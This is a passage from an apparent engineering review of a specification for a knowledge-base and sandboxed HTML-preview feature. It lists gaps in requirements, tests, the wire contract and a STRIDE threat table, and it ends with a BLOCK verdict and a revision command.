  If `os.Root` cannot be used (e.g. because the walk needs `lstat` semantics it does not expose),
  say so and state the TOCTOU as an accepted residual.

### M-13 — The index holds full note bodies, outlives revoke by seven days, and nothing requires it to stop being searchable

- **Lens:** Insecurity (Information Disclosure) / Incompleteness
- **Affected section:** FR-109, MV-15, US-16 AS-2/AS-3, test 52

MV-15 (0700/0600) exists because the ADR recognised the index "contains full note bodies". FR-109
then says the index is deleted "only when its last mount is revoked **and a grace period has
elapsed**" — seven days, per AW-8.

What is not stated anywhere: that revoking the last mount makes the collection immediately
unsearchable. FR-052 scopes retrieval to "knowledge bases mounted into the calling agent's
workspace", which does imply it — but the index is keyed by realpath (FR-031), so **any**
workspace that mounts that same host folder within the grace window inherits a fully populated
index of a collection it never indexed, including content that may since have been deleted from
disk. And for seven days the full text sits in `$OMNIPUS_HOME` after the operator has performed
the action they would reasonably read as "remove this".

- **Recommendation:** State the revoke semantics as a requirement: retrieval against a revoked
  collection returns the same empty/absent shape as an unmounted one, from the moment of revoke;
  the retained index is inert until a mount referencing that realpath exists again; and the grace
  window's purpose (avoiding a cold rebuild) is surfaced to the operator with an explicit "delete
  now" action. Add a test that a revoked collection is not searchable from any workspace while
  its index still exists on disk.

### M-14 — Stage 3 is not implementable: four of the ADR's authoring tools have no requirement, scenario or test, and the template placeholder set is never defined

- **Lens:** Incompleteness
- **Affected section:** §7, §14 "Writing (stage 3)", FR-100 to FR-112, NB-11, E-18

ADR D7 lists six authoring tools: `knowledge_create`, `knowledge_link`, `knowledge_set_property`,
`knowledge_append_section`, `knowledge_tasks`, `knowledge_move`/`knowledge_rename`. The spec covers
creation-from-template (FR-100 to FR-102) and rename/move (FR-103 to FR-105). **`knowledge_link`,
`knowledge_set_property`, `knowledge_append_section` and `knowledge_tasks` appear nowhere in the
document** — no user story, no scenario, no requirement, no test, no mention in §17.

Related: FR-102 requires substituting "only a **fixed documented** placeholder set". The set is
never documented. E-18 specifies behaviour for "a template referencing an **undefined**
placeholder" against a definition that does not exist, and test 42 (`TestTemplate_NoExecution`)
can only assert the negative half.

- **Recommendation:** Either add the four missing tools to §7 and §14 with their own scenarios and
  tests, or state explicitly in §7 that stage 3 covers create and rename/move only and that the
  other four are deferred with their own tracking. Write out the placeholder set as a literal
  table (name → source → example) in §10.2.

### M-15 — The wire contract is missing the fields the spec's own scenarios require, and no REST surface is defined at all

- **Lens:** Incompleteness (blocks Hard Constraint #8)
- **Affected section:** FR-080, FR-035, FR-106, MV-11, §12 "Partial results are labelled as partial"

Constraint #8 requires the schema before any Go or TS code. The spec inherits ADR D18's seven wire
types and adds nothing. Three concrete gaps that block the first line of stage-2 code:

1. **Incompleteness on the search response.** FR-035 and the BDD scenario require the
   incompleteness statement "in the **same response** as the results". D18's table has
   `KnowledgeSearchResponse` (hits) and `KnowledgeIndexProgress` (WS). There is no field on the
   search response carrying the ratio, and FR-080 explicitly says progress travels as a streaming
   frame "rather than a REST field" — which reads as forbidding exactly the field FR-035 needs.
   Both are wanted; the spec must say they are two different things.
2. **The version token.** FR-106 requires "a version token for every write". `KnowledgeConflictError`
   is in the table; the token itself is not. Header or body? On the read response, the write
   request, or both? What is the hash and its encoding?
3. **No endpoints.** §14 never names a single path or method. `GET /api/v1/knowledge/...`? Scoped
   by workspace in the path or a query param? An implementer must invent the entire REST surface
   and then discover during review that it should have been in `contracts/openapi.yaml` first.

`contracts/asyncapi.yaml` has an established `receive*` message convention and no index-progress
channel, so all of this is genuinely new work.

- **Recommendation:** Add a §11.x table: operation → method → path → request schema → response
  schema → transport. Extend `KnowledgeSearchResponse` with an explicit optional `incompleteness`
  object and say how it differs from `KnowledgeIndexProgress`. Name the version token's carrier
  and format. Make FR-080's first test (36, `TestContracts_NoDrift`) a stage-2 *entry* gate rather
  than a member of the same unordered list.

### M-16 — The browser matrix does not exist; §3 records it as "Required" rather than "To build"

- **Lens:** Infeasibility
- **Affected section:** §3 P-5, SC-012, test 12, AC-15.4

`playwright.config.ts` contains **no `projects` array** — zero occurrences of `webkit` or
`firefox` — so a single default Chromium project runs. CI installs Chromium only
(`.github/workflows/pr.yml:1140`: `npx playwright install --with-deps chromium`), and the three
`test:e2e*` scripts in `package.json` pass no `--project`.

P-5 lists this as "**Required for stage 1** — Chrome, Firefox, Safari", in a status column whose
other entries are "Done", "Open" and "To build". "Required" reads as an environment note; it is in
fact a build item comparable in size to P-4.

A second issue P-5 hides: Playwright's `webkit` is a WebKit build, not shipping Safari. For most
purposes that is a fine proxy; for **CSP semantics under an opaque origin**, which is precisely
what AC-15.4 exists to verify, it is the class of thing that differs between a WebKit build and
Safari's. The spec must say whether Playwright WebKit satisfies "Safari" or whether a manual
Safari pass is required, and who runs it.

- **Recommendation:** Change P-5 to "To build" and enumerate: a `projects` array with chromium,
  firefox and webkit; a CI change to install all three; a decision on whether the isolation specs
  run on every PR or on a separate job; and an explicit statement on Playwright WebKit versus
  Safari, with a manual verification step if the answer is "not equivalent".

### M-17 — The HIGH-risk regression guard has no baseline artefact, and it guards a function that does not make the decision it is credited with

- **Lens:** Incorrectness / false green
- **Affected section:** §2.2 HIGH-RISK WARNING, test 1, SC-013

Two defects in the spec's own designated release gate.

**The baseline.** SC-013 reads "zero diffs against **the current classification table**". No such
table is named anywhere in the spec. Nothing requires the baseline to be captured from pre-change
code. An implementer who adds the three new kinds and *then* writes
`TestClassifyLibraryEntry_ExistingKindsUnchanged` against the post-change behaviour produces a
guard that passes by construction — the false-green trap 2 pattern (a guard test that passed
673/673 with the feature it guarded deleted).

There *is* a real baseline the spec does not cite:
`src/components/library/preview/libraryPreviewKind.test.ts` already asserts images by extension and
MIME, video by extension and MIME, `.md`/`.markdown` → markdown "regardless of the
`is_text_editable` hint", `.mmd`/`.mermaid` → mermaid, `main.ts` → text and `archive.zip` → other.

**The mechanism.** §2.2 calls `classifyLibraryEntry` "the single decision point for how every
Library file renders". It is not. Its source
(`src/components/library/preview/libraryPreviewKind.ts:30-38`) contains **no HTML or PDF logic at
all**:

```ts
if (mime.startsWith('image/') || IMAGE_EXTS.has(e)) return 'image'
if (mime.startsWith('video/') || VIDEO_EXTS.has(e)) return 'video'
if (e === 'md' || e === 'markdown') return 'markdown'
if (e === 'mmd' || e === 'mermaid') return 'mermaid'
if (entry.is_text_editable) return 'text'
return 'other'
```

`.html` → `text` and `.pdf` → `other` are consequences of `entry.is_text_editable`, computed
server-side by `pkg/library/entries.go:219-229`'s `textExtensions` (which includes `.html`/`.htm`
and deliberately excludes PDF). §2.1 lists only the TS file as modified. Changing either side
alone produces a mismatch, and a TS-only regression guard cannot detect a change made in the Go
table.

- **Recommendation:** Add `pkg/library/entries.go::textExtensions` to §2.1 as a modified symbol and
  to §13.3 as protected behaviour. Require the baseline to be committed **before** the new kinds
  are added (a separate first commit extending the existing test file to the full current
  extension set), and require the guard to be mutation-proven — flip one classification, confirm
  the test dies, restore. Cite `libraryPreviewKind.test.ts` as the starting artefact.

### M-18 — US-14 is P0 and unachievable on Windows, with no required operator-visible statement

- **Lens:** Incompleteness
- **Affected section:** A-1, FR-106 to FR-108, US-14, test 48

A-1 records the limitation accurately: "Windows gets in-process protection only (ADR residual 3)".
The requirements document's O-10 asked for a decision — "**decide whether Windows gets a
compensation or a documented limitation**" — and neither the ADR nor the spec makes one that
reaches the operator.

US-14 is titled "Nothing I wrote is ever silently lost" and marked P0. FR-106 to FR-108 are stated
unconditionally. Test 48 is `!windows`-gated by inheritance from `pkg/entity`'s shape. So on
Windows the P0 promise is not kept, is not tested, and — most importantly — is not *said*. An
operator running two gateway instances against one `$OMNIPUS_HOME` on Windows loses writes exactly
as ADR-054 §5 describes, with no warning.

- **Recommendation:** Add a requirement: on Windows, the knowledge-base write path surfaces a
  persistent limitation notice (matching how the product surfaces other platform degradations),
  and the tool descriptions say so. Or decide the compensation (the `O_EXCL` pattern in
  `pkg/tools/browser/coordinator_lock_other.go` is in-tree prior art) and spec it. Either way,
  record the decision rather than the observation.

### M-19 — Residual R-7's unaddressable-filename measurement omits the length rules, and the omitted rule affects more notes than the one measured

- **Lens:** Incorrectness (measured)
- **Affected section:** §9 E-4, DS-3, §2.1 (`CleanRelPath`), ADR residual 7 (inherited)

`pkg/library/root.go::CleanRelPath` applies `pathsafe.ValidateComponent` to every segment plus
`pathsafe.ValidateRelPathLength` to the whole relative path. `ValidateComponent`
(`pkg/pathsafe/pathsafe.go:160-177`) rejects five things, not three:

| Rule | Constant | In residual 7? |
|---|---|---|
| NTFS-illegal characters `< > : " \| ? *` | `illegalRunes` (line 144) | yes |
| trailing dot or space | — | yes |
| Windows reserved device names | `reservedDeviceNames` | yes |
| component longer than **100 runes** | `MaxComponentNameLength = 100` (line 115) | **no** |
| whole relative path longer than **200 runes** | `MaxRelPathLength = 200` (line 123) | **no** |

Measured against the reference vault (748 `.md` files, hidden directories excluded, this session):

- **1 of 748** contains an illegal character — the figure the residual quotes (0.13%).
- **2 of 748** exceed 100 runes and are equally unaddressable, e.g.
  `Task — elicify-team-mcp project note — refresh operational-evidence block and reconcile body Stage line.md`
  (106 runes) and `Task — Broker returns HTTP 404 to long-lived OpenCode sessions after a broker restart (2026-08-17).md`
  (101 runes). Longest basename in the vault: 106 runes.

So the true rate today is at least **3 of 748 (0.40%)**, three times the quoted figure, and the
dominant rule is the one nobody counted. The vault's `Task — …` / `Decision — …` naming convention
produces long descriptive titles, so this rate will rise, not fall. The 200-rune whole-path limit
is not measured at all and bites hardest on a mounted vault with a deep folder hierarchy, because
for a mount the relative path is measured from the mount root.

DS-3's only length case is a **300-character** basename. The real boundary is 101, and it is
crossed by live data.

- **Recommendation:** Correct §9 E-4 and DS-3 to name all five rules. Replace DS-3 #7 with boundary
  cases at 100 and 101 runes, and add a case for a relative path at 200 and 201 runes. Re-measure
  the residual's rate including the length rules and update the ADR's residual 7 (or note the
  correction here and carry it back).

### M-20 — The reproducibility test has no tie-break rule and is written to be flaky

- **Lens:** Infeasibility
- **Affected section:** FR-046, SC-009, test 32, US-11 AS-1

FR-040 defines a deterministic tie-break for **link** resolution (exact path → unique basename →
shortest → lexicographic). Nothing defines one for **search results**. Test 32 asserts "identical
ranked results" across a delete-and-rebuild, and SC-009 raises it to "across 10 consecutive
rebuilds".

bleve returns hits ordered by score; the relative order of equal-scoring documents is not part of
its contract and can vary with segment layout, which varies with merge scheduling, which varies
per build. On a synthesised fixture (M-04) with a small vocabulary, score ties will be *common*.

The ADR already learned this lesson once — M-4 in its review killed a "byte-identical" property
test for the same reason and the ADR's own D6 cites `false-green-patterns.md`. The spec then
reintroduces the same hazard one level up.

- **Impact:** The test flakes, and the documented outcome of a flaky assertion in this repo is that
  it gets weakened into one that asserts nothing.
- **Recommendation:** Add a requirement that search results are totally ordered by
  (score desc, path asc) before being returned, so the ranking is deterministic by construction
  rather than by luck. Then test 32's assertion becomes safe. State it as an FR, not a test note,
  because it is a product property (stable result order across identical queries) as well as a
  test enabler.

### M-21 — Three tests require injection seams that no requirement mandates, and one of them cannot fail

- **Lens:** Infeasibility
- **Affected section:** tests 14, 19, 33; FR-021, FR-043, FR-045

- **Test 14** (`TestDetectKnowledgeBase_NoContentReads`) — "Read-counting fake".
- **Test 19** (`TestResolveLink_ContainmentTraversal`) — "Read-recording fake proves no read".
- **Test 33** (`TestIndexing_NoModelCalls`) — "Failing model client".

All three require the code under test to accept an injected dependency. FR-021 ("MUST NOT read
file contents to decide detection"), FR-043 (containment) and FR-045 (no model calls) say nothing
about a seam. The natural implementation calls `os.Stat`/`os.ReadFile` directly, at which point
none of the three tests can be written as described — and the likely substitute is something that
cannot fail.

Test 33 has a sharper problem: if the indexing package has no model-client dependency at all —
which is the *correct* design — then a "failing model client" cannot be injected, and any test
that passes is passing by construction. A test that cannot fail proves nothing
(`false-green-patterns.md`, checklist item 5).

- **Recommendation:** Promote the seams to requirements: detection and the walker take a
  filesystem interface (or an `os.Root`, see M-12) whose calls are observable in tests; the
  indexing package takes no model client and that absence is asserted structurally — e.g. a test
  that the package's import graph contains no provider package, which *can* fail when someone adds
  one. Add a line to each of tests 14, 19 and 33 stating the mutation that must kill it.

---

## 4. MINOR

### m-01 — §2.2's impact numbers are internally inconsistent

§2.4/§2.2 state "5 callers across Chat (7 hits, direct) and Tools (2, indirect)" and "13 impacted"
for the TS `isSafeHref`. Verified: 3 files, 5 call sites — `chat/IframePreview.tsx:69,327`,
`chat/markdown-shared.tsx:64,79`, `chat/tools/WebFetchPreview.tsx:53`. The "5 callers" figure is
right; "7 + 2 = 9" contradicts it, and "13" is not reproducible from a direct grep. Since the
HIGH-RISK warning rests on this table, fix the arithmetic or label the transitive figures as
GitNexus impact counts distinct from call sites.

### m-02 — Two dataset rows are mis-traced

DS-1 #10 (`[[Target]]` × 5,000 in one note) traces to **E-5**, which is a *file-size* edge case
(200 MB note). DS-4 #7 (file deleted between read and write) traces to **E-11**, which is
*collection folder deleted while mounted*. Retrace both or add the missing edge cases.

### m-03 — SC-007 references a dataset that does not exist

"…in 100% of attempts across **the isolation dataset**". §13.2 defines DS-1 (links), DS-2 (scale),
DS-3 (filenames), DS-4 (write conflicts) and DS-5 (preview inputs). There is no isolation dataset.
Either add DS-6 or restate SC-007 against tests 26 and 27.

### m-04 — SC-011's parameters appear nowhere in its test, and "lost" has no detector

SC-011: "Zero lost writes across **1,000** concurrent cross-process write attempts." Test 48
states no iteration count, and nothing defines how a lost write is *observed* — each writer must
write distinguishable content and a final reconciliation must account for every attempt. 1,000
re-execs of the Go test binary is also a CI-time question nobody has priced.

### m-05 — US-11 AS-5 is not falsifiable

"**Given** no agent has ever run, **When** the graph is queried, **Then** it is complete and
correct." "Complete and correct" has no oracle. It maps to test 33, which asserts only that no
model was called. Restate as: the graph produced with no agent running is byte-equal in its
link/backlink/unresolved/orphan sets to the graph produced in the reference run — which is testable
and is what the scenario means.

### m-06 — MV-10's "configurable" names no configuration key

"Lock acquisition bound 5 s, **configurable**." Config keys are operator-facing and expensive to
rename. Name it (e.g. `knowledge.lock_timeout_seconds`), state where it lives, and say whether it
is restart-gated.

### m-07 — Ten edge cases have no test

E-1, E-4, E-9, E-12, E-13, E-14, E-15, E-16, E-17 and E-18 appear in §9 (and some in the datasets)
but in no row of §13.1. **E-16** matters most: "two Omnipus processes opening the same index → one
opens, the other reports a bounded lock error rather than hanging" is the exact case ADR O-8
identified as real, given scorch's process-exclusive bbolt lock with a 5 s bound
(`pkg/memrooms/index/index.go:77`). It deserves a test, not a table row.

### m-08 — Four BDD scenarios have no test

"A previewed page cannot read the session cookie when embedded" (US-2 AS-2), "Completed indexing
shows no incompleteness notice" (US-6 AS-4), "A fast unchanged reconcile shows nothing" (US-6
AS-6), "An empty collection offers a first note" (US-16 AS-1). The first is a P0 scenario; the last
is the entry point of US-16.

### m-09 — FR-007 is subjective, and the reusable precedent is not cited

"MUST display a **persistent untrusted-content boundary** outside any inline-rendered frame" has no
measurable form — a reviewer cannot say whether a given implementation satisfies it. There is
in-tree prior art the spec does not mention: `src/components/chat/UntrustedChildText.tsx:20-35`
exports `UntrustedOriginBadge`, described as chrome that means "a human can never mistake
child-emitted text for content the engine or a human authored". Cite it and state the concrete
properties (always visible without scrolling, rendered outside the frame's box, not obscurable by
frame content, carries the file's origin).

### m-10 — `?path=` is unspecified in encoding and qualification

US-3 requires a URL that "identifies that file". Unstated: which workspace and which mount the
path is relative to; how a path containing `#`, `&` or `%` is encoded; what happens when the path
names a collection outside the caller's workspace (FR-052 must apply here too, or the deep link is
a cross-workspace read primitive); and how it interacts with R-7's unaddressable names. The
extension point exists and is not cited: `src/routes/_app/library.tsx:46-53` already has a
`validateSearch` zod schema with a `workspace` param, and `LibraryExplorer.tsx:90-97` documents
that in-tab navigation is deliberately *not* synced to the URL — a stated intent this work
reverses.

### m-11 — §13.3's regression rows are assertions, not guards

"`web_serve` preview tokens are not evicted — **No `ServedSubdirs` registration is added by this
feature**" and "Chat markdown link-handling tests remain green **and unmodified**" have no
mechanical enforcement. This repo's own precedent is that a note cannot stop `git merge`:
`scripts/check-no-jpeg-screencast.sh` and `scripts/check-vitest-coverage.mjs` exist for exactly
this reason. Add a CI check for the `ServedSubdirs` claim and a checksum or CODEOWNERS guard for
the chat markdown test files.

### m-12 — The document the tests are meant to obey does not exist on this branch

`docs/internal/false-green-patterns.md` is cited by ADR D6 and by CLAUDE.md as required reading
before trusting any green result. It is not present in this worktree — it landed later on
`ci/enforcement-hardening` (commit `fa968df9`). Anyone implementing from this branch cannot read
the rules. Rebase or cherry-pick it before work starts.

### m-13 — No observability requirement anywhere

Fifteen success criteria, none about operating the feature. Nothing requires a metric or log for:
index build duration and outcome, search latency, containment refusals (FR-043/FR-044 report only
to `doctor`), version-token conflicts, evicted-file failures, or unaddressable-file counts. A
symlink-escape attempt in a mounted collection is a security-relevant event and should be an audit
record, not a line in a report someone runs manually.

### m-14 — No kill switch for the inline preview

Stage 1 adds a P0 rendering surface for untrusted HTML. If a browser update breaks the CSP, the
only remedy specified is a rollback. The product already has the right shape for this:
`gateway.preview_enabled` is live, read per request, and needs no restart. A matching
`library.inline_preview_enabled` costs almost nothing and is the difference between a config
change and an incident.

### m-15 — Stage 1's contract obligation is unstated

FR-080 is filed under "Boot, contracts, audit (**stage 2**)". Stage 1 adds an inline mode to
`/api/v1/library/` and D18 lists `LibraryInlineDisposition` as a wire type. If any new field
crosses the boundary in stage 1 — and an inline-disposition hint is exactly that — Constraint #8
applies at stage 1, before the first line of handler code. Say so.

### m-16 — No rollback story for stage 2's on-disk artefacts

Stage 2 writes `.omnipus-vault/` into the operator's real folders (FR-022). Rolling stage 2 back
leaves those directories behind, in folders that are also git repos and Syncthing shares. Either
state that this is acceptable and why, or specify the cleanup.

### m-17 — E-5's body cap is stated as both documented and open

§9 E-5: "Indexed with a **documented** body cap, or skipped and reported." §17 AW-7: "Body-size cap
for a single note — **ambiguous** — likely assumption 1 MB." Same fact, two statuses. Close AW-7
into §10.2 as an MV constant.

---

## 5. Observations

### o-01 — Neighbourhood queries serve a surface the ADR rejected

MV-9, FR-054 and US-8 AS-4 specify hop/node-bounded neighbourhood queries. ADR D8 explicitly
rejects a graph view ("No visual graph view… the surface that fails first in every Obsidian
report"), and nothing in the operator-facing product consumes a neighbourhood. Consider cutting it
from stage 2 and reintroducing it when a consumer exists — it is three requirements, one MV
constant and part of a test for a capability nothing calls.

### o-02 — Stage 4 is fully specified against a contract that does not exist

US-17, its three scenarios, FR-120, FR-121 and tests 55-56 are written against `ev`'s lock layout,
which O-2 records as not yet a documented contract. If that layout differs from the assumption, all
of it is rewritten. The founder asked for all four stages in detail, so this is sanctioned — but it
is worth recording that stage 4's detail has a shorter half-life than the rest.

### o-03 — The existing performance harness is not cited

`tests/perf/` (seven benchmark files), `pkg/testutil/load_harness.go` (with `PeakRSSBytes`,
`P95FirstToken`, `Percentile`) and `.github/workflows/perf-nightly.yml` all exist. §4 says "New
dependencies: none" and nothing about which harness tests 37-39 join. Naming it would resolve half
of M-03 on its own.

### o-04 — The baseline SC-013 needs already exists

`src/components/library/preview/libraryPreviewKind.test.ts` asserts the current classification for
images, video, `.md`/`.markdown`, `.mmd`/`.mermaid`, `main.ts` and `archive.zip`. Cite it as the
starting artefact for test 1 rather than implying the table must be created.

### o-05 — §18's holdout scenarios are the strongest part of the document

Seven scenarios, correctly excluded from traceability, correctly forbidden as development targets.
H-6 (the hostile page that tries cookies, the API, egress *and* a convincing login form) is the
best-designed check here — it tests the one thing the automated suite cannot, which is whether a
human is fooled. Keep them exactly as they are.

### o-06 — The cross-process test mechanism is real and worth naming

Test 48 says "matching `pkg/entity`". The mechanism is: re-exec `os.Args[0]` with
`-test.run=^TestName$ -test.count=1 -test.timeout=60s`; an env-var marker branches the re-exec'd
binary into child mode; the child reports via `os.Exit` because the parent's `*testing.T` cannot
observe another process; `//go:build !windows` on both files. Naming this in §11 saves the author
a re-derivation.

### o-07 — AW-9 is a scope question wearing an ambiguity's clothes

"Whether the reading rail appears for markdown outside a knowledge base" is not an ambiguity — it is
a product decision that adds a surface (with its own requirements and tests) or does not. Answer it
in §7, not §17.

---

## 6. Structural integrity (plan-spec mode)

| Check | Result | Notes |
|---|---|---|
| Every user story has acceptance scenarios | **PASS** | All 17 stories carry them; US-17 correctly reduced for a gated stage |
| Every acceptance scenario has BDD scenarios | **FAIL** | US-7 AS-2 to AS-9 (embeds, callouts, frontmatter, outline, backlinks, wikilink click, unresolved marking, docked rail), US-5 AS-1 to AS-6, US-8 AS-1/AS-2/AS-4/AS-5, US-12 AS-3/AS-4, US-16 AS-1 (partial) have no Gherkin scenario |
| Every BDD scenario has a `Traces to:` reference | **PASS** | Every block carries one; verified against §5-§7 |
| Every BDD scenario has a test in the TDD plan | **FAIL** | Four have none — see m-08 |
| Every FR appears in the traceability matrix | **PASS** | All 61 FRs are present as rows |
| Every BDD scenario in the traceability matrix | **PARTIAL** | The matrix is keyed by FR, not scenario; several scenarios reachable only through an FR that maps to an unrelated test (M-02) |
| Test datasets cover boundaries, edges, errors | **PARTIAL** | DS-1 and DS-5 are strong. DS-3's length boundary is at the wrong value (M-19). No dataset for isolation (m-03), audio MIME, CSP directives, or marker malformation |
| Regression impact addressed | **PARTIAL** | §13.3 identifies the right six areas; two of six rows are unenforceable assertions (m-11) and it omits `pkg/library/entries.go::textExtensions` (M-17) and `logLibraryAudit` (M-08) |
| Success criteria are measurable | **FAIL** | SC-001 to SC-005 depend on an unspecified fixture and a mis-named metric (M-03, M-04); SC-007 names a non-existent dataset; SC-010 is unrunnable in CI; SC-011 has no detector |

---

## 7. Test coverage assessment

**Strengths.** The negative tests the ADR review demanded are all present and correctly named as
required: 26 (cross-workspace isolation), 19 (containment, with a read-recording assertion), 48
(cross-process write), 34/35 (boot and migration), 1 (the regression guard). Test 32's explicit
"**Never** byte comparison" note is exactly right. Test 47's "Hash, not mtime" note is exactly
right. The hierarchy (unit → integration → E2E, cross-process and browser last) is sensible and
the stage partition is clean.

**Gaps, by category.**

| Category | Gap |
|---|---|
| Missing level | The entire reading surface (FR-060 to FR-065) has no component test at any level |
| Missing negative | No test that creating a knowledge base at an arbitrary host path is refused (FR-025 is a security requirement mapped to test 15, which asserts marker contents). No test for a malformed marker. No test that a revoked collection is unsearchable while its index survives |
| Missing boundary | Filename length at 100/101 runes and path length at 200/201 (M-19). Excerpt at exactly 512 bytes (MV-8 has no test). `top_n` at exactly 100. Zero-length query |
| Missing concurrency | Only test 48. Nothing for two processes opening the same index (E-16), nothing for a search issued while a batch commit is in flight |
| Missing idempotency | Re-running an interrupted rename to completion is covered (test 45); re-running a *completed* one is not |
| Cannot run | Tests 37, 38, 39 (M-03) |
| Cannot fail | Test 33 as described (M-21); test 1 unless the baseline is pinned first (M-17) |
| Asserts the wrong thing | Test 3 (M-03/C-03); tests credited with FR-002, FR-007, FR-038, FR-050 (M-02) |
| Flaky by design | Test 32 without a result-ordering rule (M-20) |

**Against `false-green-patterns.md` specifically.** The spec avoids the stopwatch trap (no test
uses elapsed time as a proxy for a discrete property) and avoids the substring trap (no test
asserts on source text) — both good. It does not avoid: the "pattern matches nothing" trap (M-03),
the "guard written after the change" trap (M-17), the "test that cannot fail" trap (M-21), or the
"hardcoded list decides what runs" trap in its mildest form (the §13.1 table is itself a
hand-maintained list of what will be written, with no mechanical check that all 56 exist and run).

---

## 8. STRIDE summary

| Component | Threat | Covered? |
|---|---|---|
| Inline preview response | **Spoofing** — page draws a fake Omnipus login | Partly. FR-007 requires chrome but is subjective and its test cannot verify it (M-02, m-09). H-6 is the real check |
| Inline preview response | **Information disclosure** — session read, API called as operator | Intended by FR-005/C-01; **the control is not designed** (C-01) |
| Inline preview response | **Information disclosure** — egress/beacon | **No.** FR-006 covers `connect-src` only; `<img>`, `<iframe>`, popups and navigation are unaddressed (C-02) |
| Inline preview response | **Elevation** — SVG or XHTML served inline as a scriptable document | **No.** Allow-list unenumerated (M-06) |
| KB walker | **Information disclosure** — read outside the collection | Symlinks yes (FR-044); **hardlinks no**; TOCTOU open (M-12) |
| KB retrieval | **Information disclosure** — cross-workspace | Yes for search (FR-052, test 26); graph/outline paths untested and the observable is contradictory (M-09) |
| KB retrieval | **Elevation** — note content as agent instructions | **No.** Dropped from the ADR (M-11) |
| KB index | **Information disclosure** — full note bodies at rest, and after revoke | Partly. MV-15 sets modes; the seven-day post-revoke window is unaddressed (M-13) |
| KB index | **DoS** — self-inflicted by unbounded queries | Yes: MV-6 to MV-9 plus FR-055 — though FR-055 states no rate and has no test |
| KB write path | **Tampering** — lost update | Yes on POSIX (FR-106/FR-107, test 48); **not on Windows, and not said** (M-18) |
| KB write path | **Repudiation** — unaudited mutation | Requirement exists (FR-090); substrate has no agent id and no refusal path (M-08) |
| Marker | **Tampering** — operator-editable file drives behaviour | Partly. NB-11 covers template execution; the template *path* read from the marker has no containment rule, and the format is unspecified (M-10) |
| Boot | **DoS** — coverage gap aborts boot | Yes (FR-070, test 34) — but the tool list is absent and test 34's precondition is unachievable at stage 2 (M-01) |

---

## 9. Unasked questions

Questions the spec should have answered and does not. These are for the author, not findings.

1. What is the exact CSP header value, and against which browser versions was it verified?
2. Which extensions are on the inline allow-list, and what is each one's Content-Type?
3. Does `%%…%%` stripping apply to chat markdown, or only to knowledge-base notes?
4. What are the REST endpoints — paths, methods, request and response schemas?
5. What is the file inside `.omnipus-vault/`, in what format, with what version field?
6. What are the tool names, and what is each one's seeded posture per core agent?
7. Where does the version token travel — header or body — and what hash is it?
8. Does the freshness scan hash, or not? If not, what is the operator told about staleness?
9. What generates the 100k fixture, and what are its term and length distributions?
10. Which CI job fails when p95 search latency exceeds 500 ms?
11. What does "resident memory" mean in MV-2 and MV-3 — OS RSS, or Go heap?
12. Is Playwright's WebKit build an acceptable stand-in for Safari for CSP verification?
13. What happens to a collection's index the moment its last mount is revoked, before deletion?
14. What is the fixed placeholder set for templates?
15. What is the product behaviour on Windows, and where is the operator told?
16. Are `knowledge_link`, `knowledge_set_property`, `knowledge_append_section` and
    `knowledge_tasks` in scope for stage 3, or deferred?
17. Which workspace and mount does a `?path=` deep link resolve against?
18. Who runs the browser matrix, and what happens to stage 1's schedule if AC-15.4 fails?

---

## 10. Verdict and next action

**Verdict: BLOCK.**

Five criticals, of which four block stage 1 alone. The spec cannot be handed to an implementer in
its current form: its P0 security control is undesigned, two of its requirements contradict each
other, one of its named fixes is in the wrong function, and its own status line disagrees with its
own prerequisite table.

The fastest route to REVISE is not to answer all fifty findings. It is to run the experiment
ADR-067 D15 asked the spec round to run — the fixture bundle against candidate CSP headers in
three browsers — because that single measurement closes C-01, resolves C-02's directive question,
determines whether A14 is needed, and tells you what M-06's allow-list table must contain. Do that
first, write the answer into §10.2 as literals, then work through the rest.

To address these findings, run:

```
/plan-spec --revise docs/internal/specs/adr-067-knowledge-base-and-preview-spec.md docs/internal/specs/adr-067-knowledge-base-and-preview-spec-review.md
```
